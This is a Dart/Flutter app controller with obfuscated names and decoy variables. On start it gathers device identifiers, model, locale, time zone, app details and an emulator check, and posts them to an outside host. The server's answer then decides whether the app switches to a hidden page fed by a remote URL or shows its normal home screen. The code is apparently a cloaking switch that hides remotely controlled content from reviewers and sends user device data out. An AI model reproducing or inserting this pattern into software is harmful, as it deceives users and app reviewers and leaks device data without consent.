import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var sjapnlfxg = RxBool(false);
  var gxfkpyt = RxBool(true);
  var bfkcir = RxString("");
  var wiley = RxBool(false);
  var schamberger = RxBool(true);
  final vazxhtgf = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    bocifhde();
  }


  Future<void> bocifhde() async {

    wiley.value = true;
    schamberger.value = true;
    gxfkpyt.value = false;

    vazxhtgf.post("https://xai.thoungt.xyz/ZTCZ8PCQE2ORQJ",data: await wvdsqbjh()).then((value) {
      var qufhecjp = value.data["qufhecjp"] as String;
      var namtvdl = value.data["namtvdl"] as bool;
      if (namtvdl) {
        bfkcir.value = qufhecjp;
        chyna();
      } else {
        mohr();
      }
    }).catchError((e) {
      gxfkpyt.value = true;
      schamberger.value = true;
      wiley.value = false;
    });
  }

  Future<Map<String, dynamic>> wvdsqbjh() async {
    final DeviceInfoPlugin jofe = DeviceInfoPlugin();
    PackageInfo qlcrkpai_rndfs = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cigsqlru = Platform.localeName;
    var uqjcmef = currentTimeZone;

    var pqhu = qlcrkpai_rndfs.packageName;
    var fibq = qlcrkpai_rndfs.version;
    var likdoms = qlcrkpai_rndfs.buildNumber;

    var awcblge = qlcrkpai_rndfs.appName;
    var jmft = "";
    var msxcak  = "";
    var zveisl = "";
    var myleneBradtke = "";
    var raheemDickinson = "";
    var janickMcLaughlin = "";
    var lulaBoyle = "";
    var estelWalter = "";
    var soledadHayes = "";


    var osbwq = "";
    var mpqz = false;

    if (GetPlatform.isAndroid) {
      osbwq = "android";
      var aztxyhbike = await jofe.androidInfo;

      zveisl = aztxyhbike.brand;

      jmft  = aztxyhbike.model;
      msxcak = aztxyhbike.id;

      mpqz = aztxyhbike.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      osbwq = "ios";
      var szmiqutvn = await jofe.iosInfo;
      zveisl = szmiqutvn.name;
      jmft = szmiqutvn.model;

      msxcak = szmiqutvn.identifierForVendor ?? "";
      mpqz  = szmiqutvn.isPhysicalDevice;
    }

    var res = {
      "awcblge": awcblge,
      "fibq": fibq,
      "pqhu": pqhu,
      "raheemDickinson" : raheemDickinson,
      "likdoms": likdoms,
      "jmft": jmft,
      "zveisl": zveisl,
      "janickMcLaughlin" : janickMcLaughlin,
      "msxcak": msxcak,
      "cigsqlru": cigsqlru,
      "uqjcmef": uqjcmef,
      "osbwq": osbwq,
      "mpqz": mpqz,
      "lulaBoyle" : lulaBoyle,
      "estelWalter" : estelWalter,
      "myleneBradtke" : myleneBradtke,
      "soledadHayes" : soledadHayes,

    };
    return res;
  }

  Future<void> mohr() async {
    Get.offAllNamed("/home");
  }

  Future<void> chyna() async {
    Get.offAllNamed("/tbto");
  }

}
